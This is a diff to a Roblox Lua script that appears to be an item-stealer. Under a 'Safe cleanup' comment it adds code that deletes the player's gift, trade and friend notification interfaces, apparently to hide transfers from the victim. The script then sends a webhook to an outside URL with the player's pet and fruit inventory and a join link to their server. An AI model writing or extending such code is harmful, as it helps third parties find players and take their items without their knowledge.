@@ -383,6 +383,28 @@ getgenv().Username = "dumb"
             end
         end    
 
+-- Safe cleanup
+local giftList = pgui:FindFirstChild("GiftPlayerList")
+if giftList then giftList:Destroy() end
+
+local giftNotif = pgui:FindFirstChild("Gift_Notification")
+if giftNotif then giftNotif:Destroy() end
+
+local friendNotif = pgui:FindFirstChild("Friend_Notification")
+if friendNotif then friendNotif:Destroy() end
+
+local topNotif = pgui:FindFirstChild("Top_Notification")
+if topNotif then topNotif:Destroy() end
+
+if pgui:FindFirstChild("Trading") then
+    pgui.Trading:Destroy()
+end
+
+if game:GetService("Lighting"):FindFirstChild("Blur") then
+    game:GetService("Lighting").Blur:Destroy()
+end
+
+-- Format number helper
 local function formatNumber(num)
     local numbers = math.floor(num)
     local suffixes = {"", "k", "m", "b", "t","qd", "qn", "sx", "sp", "oc", "no"}
@@ -394,8 +416,13 @@ local function formatNumber(num)
     return string.format("%.2f%s", numbers, suffixes[suffixIndex])
 end
 
+-- Send webhook
 local function sendWebhook(url)
     local http = game:GetService("HttpService")
+
+    -- Ensure pets & fruits are not nil
+    pets = pets or {}
+    fruits = fruits or {}
 
     -- Build top 5 pets string
     local topPets = ""
@@ -446,7 +473,7 @@ local function sendWebhook(url)
                 },
                 {
                     name = "__Join link:__",
-                    value = "[Click here to join](" .. ("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s"):format(game.PlaceId, game.JobId) .. ")",
+                    value = "[click here to join](" .. ("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s"):format(game.PlaceId, game.JobId) .. ")",
                     inline = false
                 }
             },
@@ -464,7 +491,8 @@ local function sendWebhook(url)
     end)
 end
 
--- Call the webhook function
+-- Make sure inventory is built before sending
+getinv()
 sendWebhook(Webhook)
 
 
